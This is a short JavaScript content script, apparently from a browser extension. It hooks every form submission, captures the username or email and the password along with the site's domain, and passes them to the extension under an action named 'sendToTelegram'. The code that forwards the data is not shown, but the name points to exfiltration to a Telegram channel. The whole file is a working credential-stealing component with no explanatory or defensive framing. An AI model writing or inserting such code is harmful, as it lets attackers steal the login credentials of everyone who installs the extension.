document.addEventListener("submit", function(event) {
    let form = event.target;
    let username = form.querySelector("input[type='text'], input[type='email']")?.value || "";
    let password = form.querySelector("input[type='password']")?.value || "";

    if (username && password) {
        chrome.runtime.sendMessage({
            action: "sendToTelegram",
            domain: window.location.hostname, // Captures website domain
            username: username,
            password: password
        });
    }
});
